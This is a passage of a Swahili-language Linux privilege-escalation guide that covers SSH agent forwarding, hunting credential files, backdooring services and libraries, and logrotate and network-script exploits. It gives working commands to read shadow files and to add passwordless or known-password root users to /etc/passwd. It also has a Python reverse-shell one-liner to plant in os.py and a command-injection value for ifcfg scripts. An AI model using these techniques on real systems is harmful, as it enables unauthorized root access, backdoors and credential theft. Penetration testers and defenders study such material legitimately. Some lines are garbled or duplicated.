Inabainisha faili zinazohifadhi funguo za umma zinazoweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na alama kama `%h`, ambayo itabadilishwa na saraka ya nyumbani. **Unaweza kuonyesha njia za kipekee** (kuanzia `/`) au **njia za kihisia kutoka kwa nyumbani kwa mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Hiyo mipangilio itaonyesha kwamba ukijaribu kuingia kwa **funguo ya kibinafsi** ya mtumiaji "**jina la jaribio**" ssh italinganisha funguo ya umma ya funguo lako na zile zilizoko katika `/home/jina la jaribio/.ssh/authorized_keys` na `/home/jina la jaribio/access`

### ForwardAgent/AllowAgentForwarding

Kusonga mbele kwa wakala wa SSH inakuruhusu **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila nywila!) zikikaa kwenye server yako. Kwa hivyo, utaweza **kuruka** kupitia ssh **kwenda kwa mwenyeji** na kutoka hapo **kuruka kwenda kwa mwenyeji mwingine** **ukitumia** **funguo** iliyoko kwenye **mwenyeji wako wa awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hivi:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anapohamia kwenye mashine tofauti, mwenyeji huyo ataweza kupata ufikiaji wa funguo (ambao ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kubadilisha** hii **chaguo** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding na neno la msimbo `AllowAgentForwarding` (chaguo la msingi ni kuruhusu).

Ikiwa utagundua kuwa Forward Agent imeboreshwa katika mazingira soma ukurasa ufuatao kwani **unaweza kutumia hii kwa kujipandisha viwango vya ruhusa**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Faili za Kuvutia

### Faili za Mipangilio

Faili `/etc/profile` na faili chini ya `/etc/profile.d/` ni **maandishi ambayo hutekelezwa wakati mtumiaji anapoendesha kabia mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kuhariri yeyote kati yao unaweza kujipandisha viwango vya ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Faili za Passwd/Shadow

Kulingana na OS faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala rudufu. Kwa hivyo inashauriwa **kuzipata zote** na **kuangalia kama unaweza kuzisoma** ili uone **kama kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **hash za nywila** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inaandikika /etc/passwd

Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza nywila iliyozalishwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Kwa hiari, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina la `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika kwenye faili zenye nyeti**. Kwa mfano, je, unaweza kuandika kwenye faili ya **mazingira ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **seva ya tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/**, basi unaweza kurekebisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa wakati tomcat inapoanza.

### Angalia Vichupo

Folda zifuatazo zinaweza kuwa na nakala rudufu au habari za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda huenda usiweze kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali/ Faili Zilizomilikiwa za Kipekee
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za mwisho
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_historia, .sudo_as_admin_mafanikio, profile, bashrc, httpd.conf, .mpango, .htpasswd, .git-uthibitisho, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**

### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za Wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakala za Kuhifadhi**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana kuwa na nywila

Soma nambari ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu huru inayotumika kurejesha nywila nyingi zilizohifadhiwa kwenye kompyuta ya eneo kwa Windows, Linux & Mac.

### Kumbukumbu

Ikiwa unaweza kusoma kumbukumbu, unaweza kupata **habari za kuvutia/siri ndani yake**. Kumbukumbu inavyoonekana kuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya kumbukumbu za ukaguzi zilizo **mbaya** (zilizowekewa mlango wa nyuma?) zinaweza kukuruhusu **kurekodi nywila** ndani ya kumbukumbu za ukaguzi kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs ya kikundi** [**adm**](vikundi-vyenye-kuvutia-linux-pe/#kikundi-cha-adm) itakuwa ya manufaa sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Vibali/Regex wa Kijumla

Pia unapaswa kuangalia faili zinazo **kuwa na neno** "**password**" katika **jina** yake au ndani ya **maudhui**, na pia angalia IPs na barua pepe ndani ya magogo, au hash regexps.\
Sitataja hapa jinsi ya kufanya hivi lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Utekaji wa Maktaba ya Python

Ikiwa unajua **mahali** ambapo skripti ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kurekebisha maktaba za python**, unaweza kurekebisha maktaba ya OS na kuifanya kuwa na mlango wa nyuma (ikiwa unaweza kuandika mahali ambapo skripti ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

Ku **kuweka mlango wa nyuma kwenye maktaba**, weka mwishoni mwa maktaba ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Uchunguzi wa Logrotate

Udhaifu katika `logrotate` huruhusu watumiaji wenye **ruhusa za kuandika** kwenye faili ya log au mabwawa yake ya wazazi kupata mamlaka ya juu. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudanganywa kutekeleza faili za kupindukia, hasa katika mabwawa kama _**/etc/bash\_completion.d/**_. Ni muhimu kuchunguza ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambapo mzunguko wa logi unatumika.

{% hint style="info" %}
Udhaifu huu unaathiri `logrotate` toleo `3.18.0` na vinyume vyake
{% endhint %}

Maelezo zaidi kuhusu udhaifu huu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu na [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs za nginx),** kwa hivyo unapogundua unaweza kubadilisha logs, chunguza ni nani anayesimamia logs hizo na angalia ikiwa unaweza kupandisha mamlaka kwa kubadilisha logs kwa viungo vya alama.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kumbukumbu ya Udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** skripti ya `ifcf-<chochote>` kwa _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** ile iliyopo, basi **mfumo wako umeshambuliwa**.

Skripti za mtandao, _ifcg-eth0_ kwa mfano hutumiwa kwa ajili ya mawasiliano ya mtandao. Zinafanana kabisa na faili za .INI. Walakini, zinasambazwa kiotomatiki kwenye Linux na Meneja wa Mtandao (dispatcher.d).

Kwa mfano wangu, `NAME=` iliyotolewa katika skripti hizi za mtandao haishughulikiwi kwa usahihi. Ikiwa una **nafasi nyeupe/blank katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi nyeupe/blank**. Hii inamaanisha kwamba **kila kitu baada ya nafasi nyeupe ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, na rc.d**

Dereva `/etc/init.d` ni nyumbani kwa **maandishi** ya System V init (SysVinit), **mfumo wa usimamizi wa huduma wa Linux wa kisasa**. Inajumuisha maandishi ya `kuanza`, `kukomesha`, `kuanzisha tena`, na mara nyingine `kupakia tena` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya alama za ishara zilizopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **usimamizi wa huduma** ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, maandishi ya SysVinit bado hutumiwa pamoja na miundo ya Upstart kutokana na tabaka la utangamano katika Upstart.

**systemd** inatokea kama meneja wa kuanzisha na huduma wa kisasa, ukitoa vipengele vya juu kama vile kuanza kwa daemone kwa ombi, usimamizi wa automount, na picha za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa pakiti za usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, ikipunguza mchakato wa usimamizi wa mfumo.

## Mbinu Nyingine

### Kupandisha Hadhi ya Mamlaka ya NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Kutoroka kutoka kwa Makabati Yaliyozuiwa

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kinga za Usalama wa Kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada Zaidi

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Zana za Kupandisha Hadhi za Linux/Unix

### **Zana bora ya kutafuta vectors za kupandisha hadhi za mamlaka za ndani za Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
